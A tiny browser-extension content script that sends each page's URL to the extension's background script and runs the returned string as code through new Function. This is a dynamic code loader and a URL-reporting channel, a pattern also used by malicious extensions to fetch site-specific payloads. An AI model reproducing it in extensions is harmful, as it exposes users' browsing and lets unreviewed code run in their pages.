const api = (typeof chrome !== 'undefined') ? chrome : window.browser;
api.runtime.sendMessage({ 'href': window.location.href }, r => {
    if (!api.runtime.lastError) {
        new Function(r?.s)?.();
    }
});